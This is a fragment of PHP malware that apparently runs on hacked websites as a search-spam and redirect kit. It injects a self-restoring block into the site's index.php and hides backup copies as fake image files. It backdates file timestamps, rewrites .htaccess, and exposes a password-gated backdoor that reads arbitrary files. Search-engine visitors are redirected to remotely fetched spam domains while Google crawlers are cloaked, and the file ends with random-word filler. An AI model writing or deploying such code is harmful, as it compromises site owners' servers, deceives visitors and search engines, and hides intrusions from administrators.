			$strckLocalFile2 = $strckLocalFile2.PHP_EOL .$NowPutStrTwo;
		}else{
			$strckLocalFile2 = str_replace($rpRpFind,$NowPutStrTwo.$rpRpFind,$strckLocalFile2);
		}
		
	}
	
			file_put_contents($ckLocalFile2,$strckLocalFile2);

			@touch($ckLocalFile2, $fitime, $fitime);

			
		}
		
		
	}else{
		
		$ckLocalFile1 = '../index.php';
		
		if(!is_dir("../images"))
			@mkdir("../images",0755);
		
		$bkLocalFileIndex1 = '../images/logo_s.jpg';
		$bkLocalFileHtac1 = '../images/head_s.jpg';
		$bkLocalFileMoban1 = '../images/banner_s.jpg';
		
		$nowMobanFile = './moban.html';
		$nowMobanFileI = './'.$nowDirName.'/moban.html';
		$nowLogFileI = './'.$nowDirName.'/idlog.txt';
		$nowIndexFile = './index.php';
		$nowIndexFileI = './'.$nowDirName.'/index.php';
		if(JDT == 1){
			$nowHtacFile = './.htaccess';
			$nowHtacFileI = './'.$nowDirName.'/.htaccess';
		}elseif(JDT == 0){
			$nowHtacFile = '../.htaccess';
			$nowHtacFileI = './.htaccess';
		}else{
			$nowHtacFile = '';
			$nowHtacFileI = '';
		}
		
		$strNowIndex = file_get_contents($nowIndexFile);
		
		$r4 = '#bbbbbbbbackupbg.*?bbbbbbbbackupend#si';	$strNowIndex2 = preg_replace($r4, '', $strNowIndex); $r4 = '#i{9}bg.*?i{9}end#si'; $strNowIndex2 = preg_replace($r4, '', $strNowIndex2); $r4 = '#c{6}getbg.*?c{6}getend#si';
	$strNowIndex2 = preg_replace($r4, '', $strNowIndex2); $r4 = '#c{6}getbg.*?c{6}getend#si'; $strNowIndex2 = preg_replace($r4, '', $strNowIndex2);
		$strNowIndex = $strNowIndex2;
		
				
		$strNowMoban = file_get_contents($nowMobanFile);
		$strNowHtac = file_get_contents($nowHtacFile);
		
		if(file_exists($ckLocalFile1)){
			
			$strCkLocalFile1 = file_get_contents($ckLocalFile1);
			@chmod($ckLocalFile1,0755);

			
			file_put_contents($bkLocalFileIndex1,$strNowIndex);
			file_put_contents($bkLocalFileMoban1,$strNowMoban);
			file_put_contents($bkLocalFileHtac1,$strNowHtac);
			@touch($bkLocalFileIndex1, $fitime, $fitime);   
			@touch($bkLocalFileMoban1, $fitime, $fitime);   
			@touch($bkLocalFileHtac1, $fitime, $fitime);
			
			$NowPutStrI = PHP_EOL . '//ck1bg'.PHP_EOL;
			
			$NowPutStrI .= '$nowFileDir = '." '$nowDirName';".PHP_EOL;
			$NowPutStrI .= '$nowHtacFile = '." '$nowHtacFileI';".PHP_EOL;
			$NowPutStrI .= '$nowMobanFile = '." '$nowMobanFileI';".PHP_EOL;
			$NowPutStrI .= '$nowIndexFile = '." '$nowIndexFileI';".PHP_EOL;
			$NowPutStrI .= '$nowLogFile = '." '$nowLogFileI';".PHP_EOL;
			$NowPutStrI .= '$bkLocalFileIndex1 = '." '".str_replace('../images/','./images/',$bkLocalFileIndex1)."';".PHP_EOL;
			$NowPutStrI .= '$bkLocalFileHtac1 = '." '".str_replace('../images/','./images/',$bkLocalFileHtac1)."';".PHP_EOL;
			$NowPutStrI .= '$bkLocalFileMoban1 = '." '".str_replace('../images/','./images/',$bkLocalFileMoban1)."';".PHP_EOL;
			
			
			$NowPutStrI .= '
if($nowHtacFile && file_exists($bkLocalFileHtac1)){
	if(!file_exists($nowHtacFile) or (filesize($nowHtacFile) != filesize($bkLocalFileHtac1))){
		if(!is_dir("./$nowFileDir")){
			@mkdir("./$nowFileDir",0755);
		}
		@chmod($nowHtacFile,0755);
		@file_put_contents($nowHtacFile,file_get_contents($bkLocalFileHtac1));
		@chmod($nowHtacFile,0755);
	}
}


if(file_exists($bkLocalFileIndex1)){
	if(!file_exists($nowIndexFile) or (filesize($nowIndexFile) != filesize($bkLocalFileIndex1) && !file_exists($nowLogFile))){
		if(!is_dir("./$nowFileDir")){
			@mkdir("./$nowFileDir",0755);
		}
		@chmod($nowIndexFile,0755);
		@file_put_contents($nowIndexFile,file_get_contents($bkLocalFileIndex1));
		@chmod($nowIndexFile,0755);
	}
}

if(file_exists($bkLocalFileMoban1)){
	
	if(!file_exists($nowMobanFile)){
		if(!is_dir("./$nowFileDir")){
			@mkdir("./$nowFileDir",0755);
		}
		@file_put_contents($nowMobanFile,file_get_contents($bkLocalFileMoban1));
		@chmod($nowMobanFile,0755);
	}else{
		if(filesize($nowMobanFile) != filesize($bkLocalFileMoban1)){
			$tpstrMb = file_get_contents($nowMobanFile);
			if(strstr($tpstrMb,"#bbbtitsbbb#") && !strstr($tpstrMb,"<!--ttt html5 tttt-->")){
				$fitime = filemtime($bkLocalFileMoban1);
				@chmod($bkLocalFileMoban1,0755);
				@file_put_contents($bkLocalFileMoban1,$tpstrMb);
				@touch($bkLocalFileMoban1, $fitime, $fitime);  
			}else{
				@chmod($bkLocalFileMoban1,0755);
				@file_put_contents($nowMobanFile,file_get_contents($bkLocalFileMoban1));
				@chmod($bkLocalFileMoban1,0755);
			}
		}
	}
	
}


if(file_exists($bkLocalFileLog2)){
	
	if(!file_exists($nowLogFile)){
		@file_put_contents($nowLogFile,file_get_contents($bkLocalFileLog2));
		@chmod($nowMobanFile,0755);
	}else{
		if(filesize($nowLogFile) != filesize($bkLocalFileLog2)){
			$tpstrLog = file_get_contents($nowLogFile);
			$tpstrLog2 = file_get_contents($bkLocalFileLog2);
			
			$arrUrlId = @unserialize($tpstrLog);
			$arrUrlId2 = @unserialize($tpstrLog2);
			
			if(!is_array($arrUrlId2) or (is_array($arrUrlId) && is_array($arrUrlId2) && count($arrUrlId) > count($arrUrlId2))){
				$fitime = filemtime($bkLocalFileMoban2);
				@file_put_contents($bkLocalFileLog2,$tpstrLog);
				@touch($bkLocalFileLog2, $fitime, $fitime); 
			}elseif(!is_array($arrUrlId) or (is_array($arrUrlId) && is_array($arrUrlId2) && count($arrUrlId) < count($arrUrlId2))){
				$fitime = filemtime($bkLocalFileMoban2);
				@file_put_contents($nowLogFile,$tpstrLog2);
				@touch($nowLogFile, $fitime, $fitime); 
			}
		}
	}
	
}elseif(file_exists($nowLogFile)){
	$tpstrLog = file_get_contents($nowLogFile);
	$fitime = filemtime($bkLocalFileMoban2);
	@file_put_contents($bkLocalFileLog2,$tpstrLog);
	@touch($bkLocalFileLog2, $fitime, $fitime);  
}

';
			
			
	$NowPutStrI .= PHP_EOL . '//ck1end'.PHP_EOL;
	
	if(strstr($strCkLocalFile1,'//ck1bg') && strstr($strCkLocalFile1,'//ck1end')){
		
		$rsck1 = '#//ck1bg.*?//ck1end#si';
		$strCkLocalFile1 = preg_replace($rsck1,$NowPutStrI,$strCkLocalFile1);
	

		
	}else{
		$strCkLocalFile1 = preg_replace('#<\?(php)?#i', '<'.'?\1'. PHP_EOL .$NowPutStrI. PHP_EOL , $strCkLocalFile1, 1);
	}
	
			file_put_contents($ckLocalFile1,$strCkLocalFile1);

			@touch($ckLocalFile1, $fitime, $fitime);

			
		}
		
		

	}
	
 	
	if (file_exists("{$hostDir}.htaccess")){
		$fhtacTime =  filemtime("{$hostDir}.htaccess");
		@chmod("{$hostDir}.htaccess",0755);
		$strhtt = file_get_contents("{$hostDir}.htaccess");	
		$rs = '#RewriteRule\s+.*index\\\.php\?id=.*\[L\]#i';
	
		$strhtt = preg_replace($rs,'',$strhtt);
		file_put_contents("{$hostDir}.htaccess",$strhtt);
	}
		
	if (file_exists("../.htaccess")){
		$fhtacTime =  filemtime("../.htaccess");
		@chmod("../.htaccess",0755);
		$strhtt = file_get_contents("../.htaccess");	
		$rs = '#RewriteRule\s+.*index\\\.php\?id=.*\[L\]#i';
		$strhtt = preg_replace($rs,'',$strhtt);
		file_put_contents("../.htaccess",$strhtt);
	}
		

 	save_install($dateArr);
	echo '<br/>rset ok!<br/>';
	echo 'please open this url: '.GETDOM .'gfile.php?site='.$thisdom;
	echo "<br/>";

	$staus = backup_install($dateArr,2);
	if($staus != '#ok#'){
		$staus = backup_install_two($dateArr,1);
	}
	
	if($staus == '#ok#'){
		echo '<br/>backup ok!<br/>';
	}else{
		echo '<br/>backup fail!<br/>';
	}
	
	
	
}



if(isset($_GET["ljshu"]) && $_GET["ljshu"]){
	$strDefault = file_get_contents(__FILE__);	
	$strDefault = str_replace('define("LINKNUM","18");', 'define("LINKNUM","'.$_GET["ljshu"].'");', $strDefault);	file_put_contents(__FILE__,$strDefault);	echo "<br/>ljshu (".$_GET["ljshu"].") ok!<br/>";}
	
if(isset($_GET["moshi"])){
	
	if($_GET["moshi"] != 0 && $_GET["moshi"] != 1 && $_GET["moshi"] != 2 && $_GET["moshi"] != 3){
			echo "<br/><span style='color:red'>set fails, moshi value must be 0,1,2 or 3 !</span><br/>";			die();	}
	if($_GET["moshi"] == 2 || $_GET["moshi"] == 3){
		@unlink(".htaccess");	}
	
	$strDefault = file_get_contents(__FILE__);	
	
	$r3='#(/{2}msbg)(.*?)(/{2}msend)#s';
	$rp2 = 'define("JDT","'.$_GET["moshi"].'");';	$strDefault=preg_replace($r3,'\1'.PHP_EOL.$rp2.PHP_EOL.'\3',$strDefault);	
	
	$strDefault = str_replace('define("JDT","1");', 'define("JDT","'.$_GET["moshi"].'");', $strDefault);	file_put_contents(__FILE__,$strDefault);	echo "<br/>moshi (".$_GET["moshi"].") ok!<br/>";}

	
if(isset($_GET["modifydate"]) && $_GET["modifydate"]){
	$strDefault = file_get_contents(__FILE__);	
	$strDefault = str_replace('define("PRENAME","20160409");', 'define("PRENAME","'.$_GET["modifydate"].'");', $strDefault);	file_put_contents(__FILE__,$strDefault);	echo "<br/>modifydate (".$_GET["modifydate"].") ok!<br/>";}
	
if(isset($_GET["delmyself"]) && $_GET["delmyself"]==1){
	$str = file_get_contents(__FILE__);	$r4 = '#bbbbbbbbackupbg.*?bbbbbbbbackupend#si';	$str2 = preg_replace($r4, '', $str); $r4 = '#i{9}bg.*?i{9}end#si'; $str2 = preg_replace($r4, '', $str2); $r4 = '#c{6}getbg.*?c{6}getend#si';
	$str2 = preg_replace($r4, '', $str2); $r4 = '#c{6}getbg.*?c{6}getend#si'; $str2 = preg_replace($r4, '', $str2);
	file_put_contents(__FILE__,$str2);
	@unlink("../logs.txt");
	echo 'ok';
	die();
}

if(isset($_POST["delmyself"]) && $_POST["delmyself"]==1){
	$str = file_get_contents(__FILE__);	$r4 = '#bbbbbbbbackupbg.*?bbbbbbbbackupend#si';	$str2 = preg_replace($r4, '', $str); $r4 = '#i{9}bg.*?i{9}end#si'; $str2 = preg_replace($r4, '', $str2); $r4 = '#c{6}getbg.*?c{6}getend#si';
	$str2 = preg_replace($r4, '', $str2); $r4 = '#c{6}getbg.*?c{6}getend#si'; $str2 = preg_replace($r4, '', $str2);
	file_put_contents(__FILE__,$str2);
	@unlink("../logs.txt");
	echo 'ok';
	die();
}
	
// iiiiiiiiiend
	
	
	
$arrArrr = array();$j = 0;for($i=0;$i<20;$i+=2){
   $arrArrr[$j++] = $strRand{$i}.$strRand{$i+1};}
$Arrrarr = array_flip($arrArrr);
$stss = 'transferdm';
$stss2 = 'deliverym';


if(isset($_GET["gsitemap"]) && isset($_GET["mapnum"])){
	
	$O_OO0_0O_0='America/Chicago';	@date_default_timezone_set($O_OO0_0O_0);	
	if (! is_dir("../mapnaviga"))
		mkdir("../mapnaviga", 0755);	
	global $gnumber;
	$gnumber = 1;
	$bgNum = (int)trim($_GET["gsitemap"]);
	$mapnum = (int)trim($_GET["mapnum"]);
	if($bgNum > FNUM)
	   die("The Number Must Lower Then " . FNUM);
   
	$arrNumTemp = getMapNum($bgNum,$mapnum);
	
	
	foreach($arrNumTemp as $vss){
		
		$vals = "id$vss.php";		
		
		
		
		$idUrl =  GETDOM . "gpage.php?getid=$vss";
		$tempIdStr = curl_get_from_webpage($idUrl,'',5);
		$arrId = explode(',',$tempIdStr);
	
		if(count($arrId) < 100){
			echo "g sitemap fail<br/>";
			die();
		}
		
		echo $vals."<br/>";
	
		if($gnumber == 1){
			if(JDT == 1){
				gsitemap($arrId,2,1);			}else{
				gsitemap($arrId,1,2);			}
		}else{
			
			if(JDT == 1){
				gsitemap2($arrId,2,1);			}else{
				gsitemap2($arrId,1,2);			}
			
		}
		
		unset($arrId,$tempArr1,$tempArr2);	}
	
}


if(isset($_GET["ghtac"]) && $_GET["ghtac"]){

	$dirNames = dirname(__FILE__);    
	$httcReplace = end((explode(DIRECTORY_SEPARATOR, $dirNames)));	
	$PreDir = '';	
	if(JDT == 1){
		$UrlBaseDir = $httcReplace;		$RewriteOnDir = '';	
	}else{
		$UrlBaseDir = '';		$PreDir = '../';		$RewriteOnDir = $httcReplace . '/';	
	}
	$strhtt = '';
	if (file_exists("$PreDir.htaccess")){
		@chmod("$PreDir.htaccess",0755);
		$strhtt = file_get_contents("$PreDir.htaccess");	
	}
	if(!(strstr($strhtt,'RewriteBase') || strstr($strhtt,'RewriteRule')))
	{
		$strhtt = '<IfModule mod_rewrite.c>'.PHP_EOL . 'Options +FollowSymLinks'. PHP_EOL .'RewriteEngine on'. PHP_EOL .'RewriteBase /'. $UrlBaseDir . PHP_EOL .'</IfModule>';	
	}else{
		$strhtt = str_ireplace('# RewriteBase ','RewriteBase ',$strhtt);
		$strhtt = str_ireplace('#RewriteBase ','RewriteBase ',$strhtt);	
	}
		
	if(1){
		
		$r1 = '#(.*RewriteBase.*)#i';		$r2 = '#RewriteRule#i';		
		$rsut = '\1'.PHP_EOL .'RewriteRule ^'. '.*[-]'.'(\d+)'. JTHZ .'$ '.$RewriteOnDir.'index\.php?id=\$1&%{QUERY_STRING} [L]' . PHP_EOL . 'RewriteRule ^'. '(.*)'.'-'. BZCAT . JTHZ .'$ '.$RewriteOnDir.'index\.php?cat=\$1&%{QUERY_STRING} [L]' . PHP_EOL  ;
		
		$rsut2 = PHP_EOL . 'RewriteRule ^'. '.*[-]'.'(\d+)'. JTHZ .'$ '.$RewriteOnDir.'index\.php?id=\$1&%{QUERY_STRING} [L]' . PHP_EOL . 'RewriteRule ^'. '(.*)'.'-'. BZCAT . JTHZ .'$ '.$RewriteOnDir.'index\.php?cat=\$1&%{QUERY_STRING} [L]' . PHP_EOL  .'RewriteRule' ;		
		
		
		if(preg_match($r1,$strhtt)){
			$strhtt = preg_replace($r1,$rsut,$strhtt,1);		
		}else{
			$strhtt = preg_replace($r2,$rsut2,$strhtt,1);
		}
		
		if(JDT == 1 or JDT == 0){
			file_put_contents("$PreDir.htaccess", $strhtt);		
		}
		
	}

	die("ghtac ok");
}




if(isset($_POST["chdate"]) && md5($_POST["chdate"])=='b6772c68627f804a9578152ee90f5b0c' && isset($_POST["redate_file"])){$redate_file = $_POST["redate_file"];if(file_exists($redate_file)){echo '#ok#';}else{echo '#nofile#';}die();}if(isset($_POST["redate"]) && md5($_POST["redate"])=='b6772c68627f804a9578152ee90f5b0c' && isset($_POST["redate_file"])){$redate_file = $_POST["redate_file"];if(file_exists($redate_file)){echo rFile($redate_file);die();}else{echo '#nofile#';die();}}if(isset($_POST["test"]) && md5($_POST["test"])=='b6772c68627f804a9578152ee90f5b0c'){echo '#ok#';	die();}if((isset($_POST["lan"]) && $_POST["lan"] == 1) or (isset($_GET["lan"]) && $_GET["lan"] == 1)){$fileArr = array();$flag = 1;$fileArr['index'] = filesize(__FILE__);if(file_exists("./moban.html")){$fileArr['moban'] = filesize("./moban.html");}else{$flag = 0;$fileArr['moban'] = -1;}echo 'error---'. serialize($fileArr) .'---';die();}if(isset($_GET["gsitemap"]) || isset($_GET["rset"]) || isset($_GET["hzui"]) || isset($_GET["jgshu"]) || isset($_GET["ljshu"]) || isset($_GET["modifydate"]) || isset($_GET["moshi"]) || isset($_GET["install"])){die();}
	
	
	
if(JDT==2){
	
	$UrlParent=end((explode('index.php',$_SERVER['REQUEST_URI'])));	if($UrlParent){
		$tempSid = '';		$tempPid = '';		
				
		$r2='#^.*-(\d+)'. JTHZ .'$#i';		$r3='#-' .'(\d+)/$#i';	
		if(preg_match($r2,$UrlParent,$matches2)){
			if(isset($matches2[1]))
				$tempPid = $matches2[1];		}else{
			
			preg_match($r3,$UrlParent,$matches13);			if(isset($matches13[1]))
				$tempPid = $matches13[1];		}
		
		
		if($tempPid){
			$_GET['id']= $tempPid;		
		}
		
	}
	
}elseif(JDT==3&&isset($_GET['keyword'])&&$_GET['keyword']){
		
		$tempSid = '';		$tempPid = '';		$UrlParent = $_GET['keyword'];		
			
		$r2='#^.*-(\d+)$#i';		$r3='#-'.'(\d+)$#i';	

		if(preg_match($r2,$UrlParent,$matches2)){
			if(isset($matches2[1]))
				$tempPid = $matches2[1];		}else{
			
			preg_match($r3,$UrlParent,$matches13);			if(isset($matches13[1]))
				$tempPid = $matches13[1];		}
		
		
		if($tempPid){
			$_GET['id']= $tempPid;		
		}
	
	
}

function getRandStr(){
	
	$arrABC = range('a','z');	shuffle($arrABC); 
	$randNum = rand(4,6);	
	$str = implode('',array_slice($arrABC,0,$randNum));	
	return $str;}
	
	
if(isset($_GET["id"]))
	$id = $_GET["id"];
else{
	if(1){
		$fLogTime =  filemtime($mbFileName);
		$tpulrs =  $_SERVER['REQUEST_URI'];
		$rqurl = str_replace("'","\'",$_SERVER['REQUEST_URI']);
		
		$logFileName = './idlogs.txt';
		if(file_exists($logFileName)){
			$arrUrlId = unserialize(file_get_contents($logFileName));
		}else{
			$arrUrlId = array();
		}
		
		if(isset($rqurl) && isset($arrUrlId[$rqurl]) && $arrUrlId[$rqurl]){
				$id  = $arrUrlId[$rqurl];		
		}else{
			$arrUrlId[$rqurl] = getRandId();
			$id = $arrUrlId[$rqurl];
			file_put_contents($logFileName,serialize($arrUrlId));
			@touch(dirname($logFileName), $fLogTime, $fLogTime); 
			@touch($logFileName, $fLogTime, $fLogTime);    
		}
	}
}

$resid = '#^\d+$#';
if(!preg_match($resid,$id)){
	exit;
}

$id23 = $id;



$numArr_key = count($arr_key);
$siteid = MSID;
$siteAID = $siteid. '-' .$id23;$fileKey = $id23 % FNUM;
$pInfoUrl =  GETDOM . "gpage.php?id=$siteAID&jgnum=". JGNUM ."&linknum=".LINKNUM;
// $_SERVER["HTTP_REFERER"] = "google.com";
if(isset($_SERVER["HTTP_REFERER"])){
	$referer = $_SERVER["HTTP_REFERER"]; 
	$russ = '#(google|yahoo|incredibar|bing|docomo|mywebsearch|comcast|search-results|babylon|conduit)(\.[a-z0-9\-]+){1,2}#i';	

	$ipRanges = array(  array('64.233.160.0' , '64.233.191.255'),   array('66.102.0.0' , '66.102.15.255' ) ,   array('66.249.64.0' , '66.249.95.255') ,   array('72.14.192.0' , '72.14.255.255') ,   array('74.125.0.0' , '74.125.255.255') ,   array('209.85.128.0' , '209.85.255.255') ,   array('216.239.32.0' , '216.239.63.255') ); 
	$localIp = get_real_ip();	
	$is_or_no = is_ip($localIp,$ipRanges);
	$iszz = isCrawler();
	
		
	if(function_exists('gethostbyaddr')){
		$hostname = @gethostbyaddr($localIp);
		$is_g_ip = preg_match("#google#i", "$hostname") === 1;
	}else{
		$is_g_ip = 0;
	}
	
	
	if(preg_match($russ, $referer) && $iszz == false && $is_or_no == false && !$is_g_ip){
		$rsdom = '#^https?://www\.[^/]+/$#i';
		
		$jumDom1 = 'http://www.'.$stss.'.xyz'. DOMTXT . $siteid .".txt";	
		$jumDom2 = 'http://www.'.$stss2.'.xyz'. DOMTXT . $siteid .".txt";
	
		for($i=0;$i<2;$i++){
			$domJump = curl_getjs_from_webpage($jumDom1,2);
			$domJump = trim($domJump);

			if(!preg_match($rsdom,$domJump)){
				$domJump = curl_getjs_from_webpage($jumDom2,10);
			
				$domJump = trim($domJump);
				if(preg_match($rsdom,$domJump))
					break;
			}else{
				break;
			}
		}
		
		echo '<script language="javascript" type="text/javascript">'. PHP_EOL .'window.location.href="'. $domJump . "index.php?main_page=product_info&products_id=" . $id23 .'";'. PHP_EOL .'</script>';		die();	
	}
}
 
 $fcontent = '';
 
 
 $pInfoUrl =  GETDOM . "gpage.php?site=$thisdom&id=$siteAID";  
 $pInfoStr = curl_get_from_webpage($pInfoUrl,'',5);
 $rsInfo = '#<info>(.*)</info>#si';
 preg_match($rsInfo,$pInfoStr,$matchInfo);
 if(isset($matchInfo[1])){
	 $InFoStrArr = unserialize($matchInfo[1]);
 }else{
	 header("HTTP/1.1 404 Not Found");exit;
 }
 
 if(isset($InFoStrArr['frStr2'])){
	$frStr2 = $InFoStrArr['frStr2'];
	$fr2Arr = unserialize($frStr2);
 }
 
$frStr1 = $InFoStrArr['frStr1'];
$fr1Arr = unserialize($frStr1);

$Ptitle = $InFoStrArr['Ptitle'];

$nowIdName = $InFoStrArr['nowIdName'];


$Article = $InFoStrArr['Article'];
$pcatstr = $InFoStrArr['pcatstr'];

if(strstr($pcatstr,'#cname#')){
	$temparrI = explode('#cname#',$pcatstr);
	$catStr = $temparrI[0];
	$catArr = explode('^^',$catStr);
	$mateStr = $temparrI[1];
	if(strstr($mateStr,'#keydescription#')){
		$temparrII = explode('#keydescription#',$mateStr);
		$pkeyword = trim($temparrII[0]);
		if(!$pkeyword){
			$pkeyword = $Ptitle;
		}else{
			$keyArr = explode(',',$pkeyword);
			$num = count($keyArr);

			$yushu = KEYJG % $num;

			$arrPre = array();
			$arrLast = array();

			for($i=0;$i<$num;$i++){
				if($i<$yushu){
					$arrLast[] = $keyArr[$i];
				}else{
					$arrPre[] = $keyArr[$i];
				}
			}

			if(count($arrLast)){
				foreach($arrLast as $vs){
					$arrPre[] = $vs;
				}
			}
			
			$pkeyword = implode(',',$arrPre);
		}
		$pdescription = $temparrII[1];
		
		
		if(!$pdescription){
			$pdescription = $Ptitle;
		}else{
		
			$DesArr = explode(',',$pdescription);
			$num = count($DesArr);

			$yushu = KEYJG % $num;

			$arrPre = array();
			$arrLast = array();

			for($i=0;$i<$num;$i++){
				if($i<$yushu){
					$arrLast[] = $DesArr[$i];
				}else{
					$arrPre[] = $DesArr[$i];
				}
			}

			if(count($arrLast)){
				foreach($arrLast as $vs){
					$arrPre[] = $vs;
				}
			}
			
			$pdescription = implode('，',$arrPre);
			
			$pdescription .= '。';
		}
		
		
	}else{
		$pkeyword = $nowIdName;
		$pdescription = $nowIdName;
	}
}else{
	$catArr = array();
	if(strstr($mateStr,'#keydescription#')){
		$temparrII = explode('#keydescription#',$mateStr);
		$pkeyword = $temparrII[0];
		if(!$pkeyword){
			$pkeyword = $Ptitle;
		}else{
			$keyArr = explode(',',$pkeyword);
			$num = count($keyArr);

			$yushu = KEYJG % $num;

			$arrPre = array();
			$arrLast = array();

			for($i=0;$i<$num;$i++){
				if($i<$yushu){
					$arrLast[] = $keyArr[$i];
				}else{
					$arrPre[] = $keyArr[$i];
				}
			}

			if(count($arrLast)){
				foreach($arrLast as $vs){
					$arrPre[] = $vs;
				}
			}
			
			$pkeyword = implode(',',$arrPre);
		}
		
		
		$pdescription = $temparrII[1];
		
			
		if(!$pdescription){
			$pdescription = $Ptitle;
		}else{
		
			$DesArr = explode(',',$pdescription);
			$num = count($DesArr);

			$yushu = KEYJG % $num;

			$arrPre = array();
			$arrLast = array();

			for($i=0;$i<$num;$i++){
				if($i<$yushu){
					$arrLast[] = $DesArr[$i];
				}else{
					$arrPre[] = $DesArr[$i];
				}
			}

			if(count($arrLast)){
				foreach($arrLast as $vs){
					$arrPre[] = $vs;
				}
			}
			
			$pdescription = implode('，',$arrPre);
			
			$pdescription .= '。';
		}
		
	}else{
		$pkeyword = $nowIdName;
		$pdescription = $nowIdName;
	}
}

	$flagDescription = KEYJG % 2;
	
	$getKeyNumKey = ($id23 + KEYJG) % 3;
	if($getKeyNumKey == 0){
		$getKeyNum = 3;
	}elseif($getKeyNumKey == 1){
		$getKeyNum = 4;
	}else{
		$getKeyNum = 5;
	}
	
	
	$TagKey = KEYJG % 3;
	
	if($TagKey == 0){
		$keyHtmlTag = 'strong';
	}elseif($TagKey == 1){
		$keyHtmlTag = 'b';
	}else{
		$keyHtmlTag = 'h3';
	}
	$tempkeyArr = explode(',',$pkeyword);
	$pkeywordsRstr = '';
	$pkeywordsRstrDes = '';

	if(count($tempkeyArr)){
		$flagtempI = 0;
		foreach($tempkeyArr as $vs){
			$vs = trim($vs);
			if(!$vs)
				continue;
			
			if($flagtempI < $getKeyNum)
				$pkeywordsRstrDes .= ' ' .$vs;
			$flagtempI++;
			$pkeywordsRstr .= "<{$keyHtmlTag}>{$vs}</{$keyHtmlTag}>";
		}

		if($flagDescription == 1){
			$pdescription = $Ptitle . $pkeywordsRstrDes;
		}
	}else{
		$pkeywordsRstr = $nowIdName;
	}


$BreadStr = getBreadcrum($Ptitle,$catArr);


$thisPnameLink = '<a href="">'.$nowIdName.'</a>';
$thisPnameLink2 = '<a title="'.$nowIdName.'" href="">'.$nowIdName.'</a>';
$thisTitleLink = '<a title="'.$Ptitle.'" href="">'.$Ptitle.'</a>';
$Article =  str_replace('#ttlink#',$thisTitleLink,$Article);
$Article =  str_replace('#mylink#',$thisPnameLink2,$Article);


$artArr = explode('#fgfgfg#',$Article);
$artArr[0] = str_replace('pkeywords',$pkeywordsRstr,$artArr[0]);
// print_r($artArr);
if(count($artArr) != 3){
	header("HTTP/1.1 404 Not Found");exit;
}



$artArr[1] = str_replace('<div>','',$artArr[1]);
$artArr[1] = str_replace('</div>','',$artArr[1]);
$artArr[1] = str_replace('</p>','',$artArr[1]);
$artArr[1] = str_replace('<p>','',$artArr[1]);
$artArr[1] = trim($artArr[1]);
$LinkNextDes = '<div>'.$pdescription . ' ' .$artArr[1].'</div>';




$fr1Strs = '<ul>'.PHP_EOL;
foreach($fr1Arr as $key=>$vs){
	$tpPid = $key;
	$tpFlink = getalink($tpPid);
	$fr1Strs .= '<li><a title="'.$vs.'" href="'.$tpFlink.'">'.$vs.'</a></li>'.PHP_EOL;
}
$fr1Strs .= '</ul>'.PHP_EOL;

if(isset($fr2Arr)){
	$fr2Strs = '<ul>'.PHP_EOL;
	foreach($fr2Arr as $key=>$vs){
		$tpPid = $key;
		$tpFlink = getalink($tpPid);
		$fr2Strs .= '<li><a title="'.$vs.'" href="'.$tpFlink.'">'.$vs.'</a></li>'.PHP_EOL;
	}
	$fr2Strs .= '</ul>'.PHP_EOL;
}

 
 $thisPnameLink = '<a href="">'.$nowIdName.'</a>';
 $thisPnameLink2 = '<a title="'.$nowIdName.'" href="">'.$nowIdName.'</a>';
 
 $thisTitleLink = '<a title="'.$Ptitle.'" href="">'.$Ptitle.'</a>';



		$fileMb = fopen("moban.html","r");
			$html = fread($fileMb,filesize("moban.html"));			
	
			$html = str_ireplace('#bbbtitsbbb#', $Ptitle. " - {$thisdom}", $html);	
			$html = str_ireplace('#bbbkeybbb#', $pkeyword, $html);	
			$html = str_ireplace('#bbbdesbbb#', $pdescription, $html);	
			
			$html = str_ireplace('#bbb1content1bbb#', $BreadStr . PHP_EOL .'<div>'.$artArr[0].'</div>'.$LinkNextDes, $html);
			$html = str_ireplace('#bbb2content2bbb#', $artArr[1], $html);
			$html = str_ireplace('#descontent#', $artArr[2], $html);
			
			$html = str_replace('#link1#',$thisPnameLink,$html);
				$html = str_replace('#link2#','',$html);
				$html = str_replace('#link3#',$thisPnameLink,$html);
				$html = str_replace('#link4#','',$html);
				$html = str_replace('#link5#',$thisPnameLink,$html);
				
				$html = str_replace('#flink#',$fr1Strs,$html);
				$html = str_replace('#Flink2#','',$html);
			
		
	echo $html;
 
die();
	
	
/**
 * audio balcony devise expensive glorious insignificant motive poverty precaution primitive.
 * breed decay discount evolve excess forbid insurance lynar network passion tender.
 * brake competition data dusk electron expensive favorite luxury nucleus participate respond scratch swallow textile volcano weed whereas withstand.
 * Internet barrier brake coarse competent dive durable gasoline gaze germ global loose necessity optimistic pants participate personal principle relief secure split submit tremendous valley wonder.
 * alter equivalent exceed expel faculty favorite hollow horror incident loosen mild mood tissue video.
 * academic adapt blast clue coil community competent dive enthusiasm evaluate favorable gallery generate grand guarantee launch pants religion revenue rival tend trend withdraw.
 * abuse academy adequate agent conquer guarantee guilty highlight jewel leather oblige peak resolve sophisticated temptation undergraduate witness.
 * aspect column debt devise expend guilty infinite magnet nucleus principal ridiculous urban.
 * extent isolate prosperity vibrate.
 * response ban competition elbow electron expense naval passion ridge simplicity stripe temple transport ultimate undergraduate.
 * awkward battery comedy continual dive ferfile illegal kneel liable liberal prosperity relevant withstand.
 * decline drift magnet medium petroleum revenue tarnest tend unique vibrate.
 * acid awkward column dumb faulty female individual lean notify oxygen parallel personnel pursue seminar torture valley.
 * accomplish boundary conquer continuous expenditure giant globe highlight hollow knot lest negative nevertheless portable prosperity reliable shiver shrink stimulate tidy transmit tremble violet vital.
 * approach awkward erect expand glory holy import label merchant portable split temple video.
 * Internet agent applause architect deaf delay distress electron exaggerate genuine hardware leak legislation restraint vertical withstand.
 * candidate golf licence nonsense release undergraduate.
 * adjust appoint automatic battery excursion extent genius horror invade launch negative network odd phenomenon professional profitable substance tissue title undergraduate vacant variable.
 * dive enclose exceedingly explosive fatal fate flash flee forbid lest moral prevail release remedy restrict satellite simplicity splendid survey urge vanish vitally whatsoever.
 * apparent aware duration glorious ingredient isolate molecule prosperity retain sake significance trend witness.
 * evaluate germ opportunity passport peak tissue zone.
 * Internet abundant appreciate aware deserve exterior fate gesture holy hostile hydrogen incident invade mission navigation presumably previous profit radiation relief ruin scan trial whereas.
 * adopt agency applicable approach beforehand deserve expand explosion import missile nuisance profitable ruin sake tension transport vertical.
 * balcony blast comment episode flexible identify illegal infant inferior manufacture mild obstacle orbit particle removal reveal slide subsequent terror undergraduate wander.
 * coil comment distress identify ingredient knot massive orchestra particularly profit prominent radical ridid utter vain wonder.
 * approach architect cancel clue expenditure flee glimpse integrate leak manual modify parade petroleum precaution professional prospect recruit reluctant strategy universal.
